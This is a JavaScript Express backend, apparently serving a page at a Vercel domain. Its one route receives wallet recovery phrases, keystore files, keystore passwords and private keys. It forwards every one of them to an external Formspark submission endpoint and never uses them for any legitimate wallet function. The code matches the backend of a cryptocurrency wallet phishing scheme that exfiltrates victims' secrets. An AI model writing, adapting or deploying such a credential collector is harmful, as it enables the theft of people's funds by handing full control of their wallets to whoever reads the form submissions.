import express from 'express';
import cors from 'cors';
import fetch from 'node-fetch'; 

const app = express();

const FORMSPARK_ENDPOINT_URL = 'https://submit-form.com/EUSRpXCa2';


app.use(cors({
    origin: 'https://flareproject.vercel.app', // Your frontend domain on Vercel
    methods: ['GET', 'POST'], // Allow GET and POST requests
    allowedHeaders: ['Content-Type', 'Authorization'] // Allow these headers
}));
app.use(express.json());

app.post('/submit-wallet-data', async (req, res) => {
    try {
        const data = req.body;
        if (!data) {
            return res.status(400).json({ status: 'error', message: 'No JSON data received' });
        }

        const wallet_type = data.wallet_type || 'Unknown';
        const phrase = data.phrase || 'N/A';
        const keystore_json = data.keystore_json || 'N/A';
        const keystore_password = data.keystore_password || 'N/A';
        const private_key = data.private_key || 'N/A';

        // Prepare the data to be sent to Formspark
        const formsparkData = {
            'Wallet Type': wallet_type,
            'Phrase': phrase,
            'Keystore JSON': keystore_json,
            'Keystore Password': keystore_password,
            'Private Key': private_key,
            'Timestamp': new Date().toISOString() 
        };

        console.log(`Attempting to forward data to Formspark for wallet type: ${wallet_type}`);
        
        // Make the POST request to the Formspark endpoint
        const formsparkResponse = await fetch(FORMSPARK_ENDPOINT_URL, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'Accept': 'application/json'
            },
            body: JSON.stringify(formsparkData)
        });

        // Check if the request to Formspark was successful
        if (formsparkResponse.ok) {
            console.log('Successfully forwarded data to Formspark.');
            // Send a success response back to the frontend
            res.status(200).json({ status: 'success', message: 'Wallet data received and forwarded to Formspark!' });
        } else {
            // If Formspark returned an error, capture its response
            const errorBody = await formsparkResponse.text();
            console.error(`Failed to forward data to Formspark. Status: ${formsparkResponse.status}, Response: ${errorBody}`);
            // Send an error response back to the frontend with Formspark details
            res.status(500).json({ 
                status: 'error', 
                message: 'Failed to forward data to Formspark',
                formspark_status: formsparkResponse.status,
                formspark_response: errorBody 
            });
        }

    } catch (error) {
        // Catch any unexpected errors during the process
        console.error(`An error occurred: ${error.message}`);
        // Send a generic 500 error response to the frontend
        res.status(500).json({ status: 'error', message: error.message });
    }
});

app.get('/', (req, res) => {
    res.send('Node.js Backend is running!');
});
export default app;
